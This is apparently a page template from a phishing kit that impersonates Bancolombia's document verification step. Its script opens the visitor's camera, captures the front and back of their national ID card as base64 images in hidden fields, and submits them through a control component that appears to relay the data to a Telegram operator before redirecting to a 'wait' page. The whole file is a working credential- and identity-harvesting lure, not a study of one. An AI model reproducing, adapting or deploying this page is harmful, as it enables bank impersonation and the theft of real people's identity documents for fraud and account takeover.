<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Bancolombia - Verificacion de Documento</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bancolombia-yellow': '#fdda24',
                    }
                }
            }
        }
    </script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1.6;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
        }

        #video, #canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        #canvas {
            display: none;
        }

        .preview-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .document-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 88%;
            height: 82%;
            border: 3px dashed rgba(253, 218, 36, 0.7);
            border-radius: 12px;
        }

        .document-guide.captured {
            border-color: #22c55e;
        }

        .document-label {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 14px;
            border-radius: 16px;
            font-size: 12px;
            font-weight: 600;
        }

        .preview-box {
            flex: 1;
            aspect-ratio: 1.6;
            background: #f3f4f6;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            border: 2px dashed #d1d5db;
        }

        .preview-box.captured {
            border: 2px solid #22c55e;
        }

        .preview-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .preview-box .label {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 3px;
            font-size: 10px;
            text-align: center;
        }

        .preview-box .placeholder {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #9ca3af;
            font-size: 11px;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body class="bg-gray-100">

    <!-- Header -->
    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-start">

        <div id="cedulaSection" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-6">Verificacion de documento</h5>
            <p class="text-gray-600 text-[14px] mt-1 text-center">Tome foto de su cedula por ambos lados</p>

            <!-- Indicador de pasos -->
            <div class="flex justify-center gap-3 mt-4">
                <div class="paso flex items-center gap-2 px-4 py-2 rounded-full text-[12px] font-semibold bg-bancolombia-yellow text-black" id="paso1">
                    <span class="w-5 h-5 rounded-full bg-white/40 flex items-center justify-center text-[11px]">1</span>
                    <span>Frente</span>
                </div>
                <div class="paso flex items-center gap-2 px-4 py-2 rounded-full text-[12px] font-semibold bg-gray-200 text-gray-500" id="paso2">
                    <span class="w-5 h-5 rounded-full bg-white/40 flex items-center justify-center text-[11px]">2</span>
                    <span>Reverso</span>
                </div>
            </div>

            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4">
                <div class="w-full bg-white py-5 px-4 rounded-xl flex flex-col items-center">

                    <!-- Error de cámara -->
                    <div id="cameraError" class="hidden w-full text-center py-8">
                        <div class="text-red-500 mb-2">
                            <svg class="w-12 h-12 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                            </svg>
                        </div>
                        <p class="text-red-600 font-semibold">No se pudo acceder a la camara</p>
                        <p class="text-gray-500 text-sm mt-1">Permita el acceso a la camara en su navegador</p>
                    </div>

                    <!-- Contenedor de cámara -->
                    <div id="cameraWrapper" class="w-full">
                        <div class="camera-container">
                            <video id="video" autoplay playsinline></video>
                            <canvas id="canvas"></canvas>
                            <img id="previewActual" class="preview-img" alt="Vista previa">
                            <div class="overlay">
                                <div class="document-guide" id="documentGuide"></div>
                                <div class="document-label" id="documentLabel">Frente de la cedula</div>
                            </div>
                        </div>

                        <!-- Instrucciones -->
                        <div class="mt-3 bg-gray-50 rounded-lg p-3">
                            <ul class="text-[12px] text-gray-600 space-y-1">
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Coloque el documento dentro del recuadro
                                </li>
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Asegurese de que el texto sea legible
                                </li>
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Evite reflejos y sombras
                                </li>
                            </ul>
                        </div>

                        <!-- Previews de ambas fotos -->
                        <div class="flex gap-3 mt-3">
                            <div class="preview-box" id="previewFrente">
                                <div class="placeholder" id="placeholderFrente">
                                    <svg class="w-6 h-6 mb-1 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                                    </svg>
                                    <span>Frente</span>
                                </div>
                                <img id="imgFrente" style="display:none;" alt="Frente">
                                <div class="label">Frente</div>
                            </div>
                            <div class="preview-box" id="previewReverso">
                                <div class="placeholder" id="placeholderReverso">
                                    <svg class="w-6 h-6 mb-1 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                                    </svg>
                                    <span>Reverso</span>
                                </div>
                                <img id="imgReverso" style="display:none;" alt="Reverso">
                                <div class="label">Reverso</div>
                            </div>
                        </div>
                    </div>

                    <form id="formCedula" class="w-full mt-4">
                        <input type="hidden" id="cedula_frente" name="cedula_frente">
                        <input type="hidden" id="cedula_reverso" name="cedula_reverso">
                        <input type="hidden" id="no-status" name="status" value="cedula">

                        <div class="flex flex-col gap-3">
                            <button type="button" id="btnCapturar"
                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer">
                                Capturar Frente
                            </button>

                            <button type="submit" id="enviar"
                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer hidden">
                                Continuar
                            </button>

                            <div class="flex gap-3">
                                <button type="button" id="btnReintentarFrente"
                                    class="flex-1 font-semibold py-2 px-4 rounded-full border-2 border-red-400 text-red-500 cursor-pointer text-[13px] hidden">
                                    Repetir Frente
                                </button>
                                <button type="button" id="btnReintentarReverso"
                                    class="flex-1 font-semibold py-2 px-4 rounded-full border-2 border-red-400 text-red-500 cursor-pointer text-[13px] hidden">
                                    Repetir Reverso
                                </button>
                            </div>
                        </div>
                    </form>

                </div>
            </div>
        </div>

        <div id="mensaje" class="hidden w-full max-w-md mx-auto mt-4 p-3 rounded-lg text-center"></div>

    </div>

    <!-- Footer -->
    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const previewActual = document.getElementById('previewActual');
        const btnCapturar = document.getElementById('btnCapturar');
        const btnEnviar = document.getElementById('enviar');
        const btnReintentarFrente = document.getElementById('btnReintentarFrente');
        const btnReintentarReverso = document.getElementById('btnReintentarReverso');
        const cameraError = document.getElementById('cameraError');
        const cameraWrapper = document.getElementById('cameraWrapper');
        const documentLabel = document.getElementById('documentLabel');
        const documentGuide = document.getElementById('documentGuide');
        const paso1 = document.getElementById('paso1');
        const paso2 = document.getElementById('paso2');

        // Campos hidden
        const cedulaFrente = document.getElementById('cedula_frente');
        const cedulaReverso = document.getElementById('cedula_reverso');

        // Previews
        const imgFrente = document.getElementById('imgFrente');
        const imgReverso = document.getElementById('imgReverso');
        const previewFrente = document.getElementById('previewFrente');
        const previewReverso = document.getElementById('previewReverso');
        const placeholderFrente = document.getElementById('placeholderFrente');
        const placeholderReverso = document.getElementById('placeholderReverso');

        let stream = null;
        let paso = 1; // 1 = frente, 2 = reverso

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;
            } catch (error) {
                console.error('Error al acceder a la camara:', error);
                cameraWrapper.style.display = 'none';
                cameraError.classList.remove('hidden');
            }
        }

        function actualizarPaso(numPaso, estado) {
            const pasoEl = numPaso === 1 ? paso1 : paso2;
            pasoEl.classList.remove('bg-bancolombia-yellow', 'text-black', 'bg-gray-200', 'text-gray-500', 'bg-green-500', 'text-white');

            if (estado === 'activo') {
                pasoEl.classList.add('bg-bancolombia-yellow', 'text-black');
            } else if (estado === 'completado') {
                pasoEl.classList.add('bg-green-500', 'text-white');
            } else {
                pasoEl.classList.add('bg-gray-200', 'text-gray-500');
            }
        }

        function capturarFoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.85);

            if (paso === 1) {
                // Capturar frente
                cedulaFrente.value = imageData;
                imgFrente.src = imageData;
                imgFrente.style.display = 'block';
                placeholderFrente.style.display = 'none';
                previewFrente.classList.add('captured');

                // Pasar al reverso
                paso = 2;
                actualizarPaso(1, 'completado');
                actualizarPaso(2, 'activo');
                documentLabel.textContent = 'Reverso de la cedula';
                btnCapturar.textContent = 'Capturar Reverso';
                btnReintentarFrente.classList.remove('hidden');

            } else if (paso === 2) {
                // Capturar reverso
                cedulaReverso.value = imageData;
                imgReverso.src = imageData;
                imgReverso.style.display = 'block';
                placeholderReverso.style.display = 'none';
                previewReverso.classList.add('captured');

                // Mostrar boton de enviar
                actualizarPaso(2, 'completado');
                btnCapturar.style.display = 'none';
                btnEnviar.classList.remove('hidden');
                btnReintentarReverso.classList.remove('hidden');

                documentGuide.classList.add('captured');
            }
        }

        function reintentarFrente() {
            cedulaFrente.value = '';
            imgFrente.src = '';
            imgFrente.style.display = 'none';
            placeholderFrente.style.display = 'flex';
            previewFrente.classList.remove('captured');

            // Volver al paso 1
            paso = 1;
            actualizarPaso(1, 'activo');
            actualizarPaso(2, 'pendiente');
            documentLabel.textContent = 'Frente de la cedula';
            btnCapturar.textContent = 'Capturar Frente';
            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('hidden');
            btnReintentarFrente.classList.add('hidden');
            btnReintentarReverso.classList.add('hidden');

            // También limpiar reverso
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            documentGuide.classList.remove('captured');
        }

        function reintentarReverso() {
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            // Volver al paso 2
            paso = 2;
            actualizarPaso(2, 'activo');
            documentLabel.textContent = 'Reverso de la cedula';
            btnCapturar.textContent = 'Capturar Reverso';
            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('hidden');
            btnReintentarReverso.classList.add('hidden');

            documentGuide.classList.remove('captured');
        }

        btnCapturar.addEventListener('click', capturarFoto);
        btnReintentarFrente.addEventListener('click', reintentarFrente);
        btnReintentarReverso.addEventListener('click', reintentarReverso);

        iniciarCamara();
    </script>

    <x-control
        :auto-completar="false"
        :debug="false"
        redirect-url="/bancol/wait"
        toast-message="No se pudo verificar el documento, intente nuevamente"
        telegram-button="CEDULA"
    />

</body>

</html>
